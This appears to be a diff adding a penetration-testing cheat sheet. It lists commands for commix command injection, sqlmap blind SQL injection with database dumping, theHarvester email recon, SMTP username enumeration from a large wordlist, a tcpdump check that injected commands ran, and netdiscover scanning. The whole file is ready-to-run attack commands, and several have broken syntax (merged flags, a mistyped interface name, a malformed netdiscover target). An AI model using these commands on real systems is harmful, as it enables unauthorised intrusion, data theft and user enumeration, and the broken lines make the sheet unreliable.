@@ -1,0 +1,22 @@
+##Command Injection with commix, ssl, waf, random agent.
+commix-url="https://supermegaleetultradomain.com?parameter" --level-3--force-ssl --skip-waf --random-agent
+
+#SQLMap
+sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl 
+sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
+
+
+#Social Recon
+theharvester -d domain.org -1 500 -b google
+
+##SMTP USER ENUM
+smtp-user-enum -M VRFY -U /opt/Seclists/Usernames/xato-net-10-million-usernames.txt -t $IP 
+smtp-user-enum -M EXPN -U /opt/Seclists/Usernames/xato-net-10-million-usernames.txt -t $IP 
+smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP 
+smtp-user-enum -M EXPN -U /opt/Seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
+
+##Command Execution Verification [Ping check]
+tcpdump -i ethe -c5 icmp
+
+#Check Network
+netdiscover / 0.0.0.0/24
